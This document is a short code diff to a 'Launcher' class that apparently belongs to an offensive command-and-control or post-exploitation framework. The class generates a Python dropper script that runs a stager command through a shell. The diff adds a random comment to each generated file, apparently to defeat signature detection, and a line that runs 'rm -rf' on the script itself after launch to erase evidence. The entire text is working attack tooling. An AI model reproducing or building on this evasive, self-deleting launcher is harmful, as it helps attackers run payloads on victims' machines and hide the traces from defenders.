@@ -1,3 +1,6 @@
+from helpers import *
+
+
 class Launcher:
     def __init__(self):
         self.info = {
@@ -10,7 +13,9 @@ class Launcher:
         return ("py", """\
         #!/usr/bin/env python
         # -*- coding: utf-8 -*-
-        import os
+        # %s
+        import subprocess
 
-        os.popen("%s")
-        """ % stager.replace('"', '\\"'))
+        subprocess.Popen("%s", shell=True)
+        subprocess.Popen("rm -rf " + __file__, shell=True)
+        """ % (random_string(numbers=True), stager.replace('"', '\\"')))
